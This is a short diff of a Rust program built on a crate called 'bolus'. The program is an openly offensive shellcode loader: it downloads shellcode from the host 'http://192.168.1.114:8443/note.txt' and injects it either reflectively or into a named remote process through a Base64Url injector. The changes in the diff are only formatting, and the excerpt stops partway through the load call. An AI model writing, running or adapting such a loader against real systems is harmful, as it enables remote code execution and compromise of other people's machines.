@@ -2,13 +2,9 @@ extern crate bolus;
 
 use bolus::{
     inject,
+    injectors::{InjectionType, InjectorType},
     load,
-    injectors::{
-        InjectionType,
-        InjectorType
-    }
 };
-
 
 /// The URL where shellcode will be downloaded from
 const URL: &str = "http://192.168.1.114:8443/note.txt";
@@ -24,7 +20,7 @@ const IGNORE_SSL: bool = false;
 fn main() -> Result<(), String> {
     let injection_type = match PROCESS_NAME {
         "" => InjectionType::Reflect,
-        _ => InjectionType::Remote(PROCESS_NAME.to_string())
+        _ => InjectionType::Remote(PROCESS_NAME.to_string()),
     };
     let injector = load(
         InjectorType::Base64Url((
